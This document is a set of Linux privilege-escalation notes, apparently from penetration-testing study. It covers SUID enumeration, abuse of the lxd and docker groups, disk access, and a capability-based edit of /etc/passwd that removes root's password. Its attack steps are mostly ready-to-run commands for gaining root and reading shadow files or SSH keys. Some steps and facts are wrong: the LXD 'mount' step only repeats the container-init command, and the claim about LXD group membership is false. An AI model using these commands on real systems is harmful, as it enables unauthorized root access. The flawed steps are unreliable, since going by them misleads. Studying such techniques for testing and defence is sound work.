## Special Permissions
### SUID
**Set User ID upon Execution**
```shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
### SGID
```shell
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
### Sudo Rights abuse
List entries in the `NOPASSWD` option.
```shell
sudo -l
```

## Privileged Groups 
### LXC / LXD
* LXD is similar to Docker and is Ubuntu's container manager. 
* Upon creation all user groups are added to LXD group
```shell
id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```
* Privileges can be escalated by creating a LXD container.  

Unzip Alpine image.
```shell
 unzip alpine.zip 
```
Start LXD initialisation processes
```shell
lxd init
```
Import the local image
```shell
 lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
Start a privileged container
```shell
lxc init alpine r00t -c security.privileged=true
```
Mount the host file system
```shell
lxc init alpine r00t -c security.privileged=true
```
Spawn a shell in the container
```shell
lxc start r00t
lxc exec r00t /bin/sh
```
### Docker
* Placing a user in the docker group is equivalent to root level access to the file system without requiring a password.
* Members of docker groups can spawn new docker containers.

Create a new docket container in root
```shell
docker run -v /root:/mnt -it ubuntu
```
Once the container is started you can add or retrieve ssh keys for the root user.

* You can do this it `/etc` to retrieve shadow files for example
### Disk 
* Users in the disk group have full acess to any device contained with `/dev` such as `/dev/sda1` which is typically the main device used by the operating system/
* An attacker can use `debugfs` to access the entire file system

### ADM
* Members of the `adm` group are able to read all logs stored in `/var/log`
* This does not give root access but you may be able to gather sensitive information 
## Capabilities
* Security feature in Linux that allows specific privileges to be granted to processes.
* Setting capabilities involves using the appropriate tools and commands to assign specific capabilities to executable's or programs.
### Set Capability 
```shell
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```
* This means that the binary will be able to perform specific actions that it would not be able to perform without the capability. 
* `cap_net_bind_service` means a binary will be able to bind to network ports.

 | **Capability**         | **Description**                                                                                                                                           |
 | ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | `cap_sys_admin`        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |
 | `cap_sys_chroot`       | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
 | `cap_sys_ptrace`       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
 | `cap_sys_nice`         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
 | `cap_sys_time`         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
 | `cap_sys_resource`     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
 | `cap_sys_module`       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
 | `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |

* When a binary is executed, it can perform the actions that capabilities allow. However it cannot perform any actions not allowed by capabilities. 
#### Values
Example values to be used with `setcap`

|**Capability Values**|**Desciption**|
|---|---|
|`=`|This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.|
|`+ep`|This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.|
|`+ei`|This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
|`+p`|This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.|
#### Privileges to escalate 
| **Capability**     | **Description**                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |

### Enumerating Capabilities
```shell
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
### Example Exploitation
```shell
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

```shell
cat /etc/passwd | head -n1
```
Remove the X off the password
```shell
/usr/bin/vim.basic /etc/passwd
```
